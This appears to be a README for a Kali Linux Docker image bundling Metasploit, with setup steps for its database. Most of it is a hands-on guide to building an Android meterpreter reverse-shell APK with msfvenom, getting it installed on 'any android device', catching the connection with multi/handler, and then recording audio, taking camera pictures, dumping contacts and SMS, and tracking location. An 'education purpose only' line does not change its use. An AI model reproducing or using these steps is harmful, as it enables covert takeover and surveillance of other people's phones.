## kalilinux-metaspolite ;-

![](https://www.kali.org/wp-content/uploads/2015/05/kali-linux-docker-images-798x284.png)
###### The Metasploit Project is a computer security project that provides information about security vulnerabilities and aids in penetration testing.

##### Original link [Docker link](https://hub.docker.com/r/vinothssv/kalilinuxmetaspolite/)

###### This container which has pre-installed PostgreSQL with metaspolite to start metaspolite please follow the below steps,
##### Lets started

> Step:1:- check postgreSQL status

    root@66c2d91b9c26:~# service postgresql status
    9.6/main (port 5432): online
    root@66c2d91b9c26:~#

###### If the container in stopped stage make it as start and running. once the postgresql is started then initialise Metasploit PostgreSQL Database

    #msfdb init

###### Once started, type below command.

    #msfconsole

###### After we logged in to the msf console check whether the database are connected to metaspolite

    msf > db_status
    [*] postgresql connected to msf3
    msf >

###### that's it. metaspolite will now working...
###### For download use below command,

    docker pull vinothssv/kalilinuxmetaspolite:version1.0
 
##### after download above container we need to start and run with some allowed ports. 
###### check the image is downloaded,

    [root@srv ~]# docker images
    REPOSITORY                        TAG                 IMAGE ID            CREATED             SIZE
    kalilinux.p                       latest              4d661b0b07ad        6 days ago          1.417 GB
    
once the image is listed, 

     docker run -it --name kaliports -p 4444:4444 -p 445:445 kalilinux.p /bin/bash
        
after we enter into the container provide the following command to create android file to explose

    root@b7152906b2a6:/# msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.123 LPORT=4444 R > /var/android.apk

After that apk has created we need to make install it to any android device and then get into the msfconsole.
    msfconsole
    
        #once we get into the msfconsole we need to check whether the database is connected or not. by below given command.
        
    msf > db_status
    [*] postgresql selected, no connection
    msf >

Once everything perfect we can start hacking..
    
    msf > use multi/handler 
    msf > set PAYLOAD android/meterpreter/reverse_tcp #payload for android
    msf > set LHOST 192.168.1.4   #android ip
    msf > set LPORT 4444 #localhost allowed port.
    msf > exploit

after it get connected with android we can give the following commands to collect the information in android mobile.
    
        ---- OTHER COMMANDS ----
    - record_mic (record audio) 
    - webcam_snap (Take a Picture) 
    - webcam_stream (Stream Camera) 
    - dump_contacts (CALL LOGS!) 
    - dump_sms (SMS LOGS!)
    - geolocate (Track Device)

Here, i have attached android.apk Please do this your own risk.

### Its tutorial only for education purpose only.
